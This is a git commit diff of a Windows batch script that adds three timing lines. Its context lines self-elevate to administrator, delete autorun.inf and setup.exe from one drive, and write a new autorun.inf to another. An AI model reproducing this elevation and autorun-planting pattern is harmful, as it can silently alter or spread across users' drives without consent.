1cb949d39320a3d506034fab443bffd9be44d795
Demir <130374789+Siradankullanici@users.noreply.github.com>
2023-04-13 09:37:17 +0300

    Add files via upload

--- mccode.bat
+++ mccode.bat
@@ -3,6 +3,9 @@ start F:\Win10_22H2_Turkish_x64.iso
 start minecod.bat
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd F:
+echo %time%
+timeout 5 > NUL
+echo %time%
 del D:\autorun.inf
 del D:\setup.exe
 copy system.inf "F:\autorun.inf"
